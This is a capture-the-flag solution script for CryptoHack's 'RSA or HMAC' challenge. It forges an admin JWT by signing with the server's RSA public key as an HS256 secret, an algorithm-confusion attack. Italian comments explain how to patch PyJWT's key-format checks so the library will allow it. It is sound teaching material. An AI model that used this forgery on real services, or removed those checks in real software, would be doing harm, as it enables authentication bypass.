'''
There's another issue caused by allowing attackers to specify their own algorithms
but not carefully validating them.

Attackers can mix and match the algorithms that are used to sign and verify data.
When one of these is a symmetric algorithm and one is an asymmetric algorithm, this
creates a beautiful vulnerability.

The server is running PyJWT with a small patch to enable an exploit that existed in
PyJWT versions <= 1.5.0. To create the malicious signature, you will need to patch
your PyJWT library too.

If you want to patch, look at the line that was added in the fix for the vulnerability.
Use pip show pyjwt to find the location of the PyJWT library on your computer, and make the edit.
For versions of PyJWT > 2.4.0 the code has been changed so you will have to edit jwt/utils.py
instead of jwt/algorithms.py
'''

import jwt
import requests

target = "https://web.cryptohack.org/rsa-or-hmac/"

se = requests.Session()

pub_key = se.get(target+"/get_pubkey/").json()["pubkey"]

session = se.get(target+"/create_session/admin/").json()["session"]

payload = {
    "username": "admin",
    "admin":True
}

jwt = jwt.encode(payload, pub_key)

flag = se.get(target+"/authorise/"+jwt).text

print(flag)

# per flaggare sta roba abbiamo tolto un controllo come suggerito dalla consegna
# normalmente infatti pyjwt non permette di firmare token con una chiave pub RS256
# usandoli come secret di HS256

# il file modificato era jwt/utils.py:

# def is_ssh_key(key: bytes) -> bool:
#     #return key.startswith(_SSH_KEY_FORMATS)
#     return False

# def is_pem_format(key: bytes) -> bool:
#   #return bool(_PEM_RE.search(key))
#   return False
